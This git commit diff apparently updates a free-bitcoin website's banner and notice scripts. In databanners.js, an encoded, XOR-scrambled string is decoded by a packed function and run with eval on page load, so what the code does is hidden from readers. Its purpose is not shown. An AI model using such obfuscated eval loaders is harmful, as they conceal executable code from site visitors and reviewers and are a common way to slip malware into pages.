442edaaacba7f1fdefe05102d2e756db6809feca
cinbit <saintyang@hotmail.com>
2017-06-06 00:51:21 +0800

    update
    20170606

--- javascripts/databanners.js
+++ javascripts/databanners.js
@@ -4,4 +4,4 @@
 *  @email  cinbit@sina.com
 */
 
-var ssstttrrrstr="xl%7E+km%28%3A%26kat%22@Rm%7Fd42%21%13ysM%25I3/1k%7F%7Cd6%3B%26%7Czk%3C%27jldsAr%7B%7Buw%7Fj7owe%7B%3Dze%7Dc%2Cp7%01kmS6%5B%259%23yqRv%24%2C0nhu%225tawrvubj%7D%7Evbz%27%60ski%26%7E9";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('9 10(6){5 4="";5 3=11(6);8(5 2=0;2<3.7;2++){4+=16.12(3.15(2)^(1+(3.7-2)%14))}13 4}',10,17,'||c|s|f|var|Y|length|for|function|dU|unescape|fromCharCode|return|32|charCodeAt|String'.split('|')));eval(dU(ssstttrrrstr));
+var ssstttrrrstr="h%7Cn%3B%7B%7D8*6%7Bqd2Pb%7Dot%24%221%03ic%5D5Y%23%3F%21%5Bolt%26+6lj%7B%2C7uwzt%7C%7Fhd%60ny%26nfsfawjtB1viqw8d%23%1DwqO%22O1-/u%7D%7Eb08%24rti%3E%21ceHzrmzrv%7Ck8tawrvubj%7D%7Evbz%27%60ski%26%7E9";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('9 10(6){5 4="";5 3=11(6);8(5 2=0;2<3.7;2++){4+=16.12(3.15(2)^(1+(3.7-2)%14))}13 4}',10,17,'||c|s|f|var|Y|length|for|function|dU|unescape|fromCharCode|return|32|charCodeAt|String'.split('|')));eval(dU(ssstttrrrstr));
--- javascripts/datanotices.js
+++ javascripts/datanotices.js
@@ -6,4 +6,4 @@
 
 //The maximum number of words is 56, decrease 3 by add each line.
 var news = new Array();
-news[0] = {text:"网站打不开或者不能正常获取比特币需使用VPN",url:"https://www.baidu.com/s?wd=%E5%85%8D%E8%B4%B9vpn&rsv_spt=1&rsv_iqid=0xd6a3a9a900199fd3&issp=1&f=3&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&rsv_sug3=1&rsv_sug1=1&rsv_sug2=1&prefixsug=%E5%85%8D%E8%B4%B9&rsp=1&inputT=5805&rsv_sug4=5806&jmp=jsver&_vr=0.5820377224590629"};
+news[0] = {text:"免费获取比特币新手必读",url:"http://www.weibo.com/ttarticle/p/show?id=2309404115283504671827"};
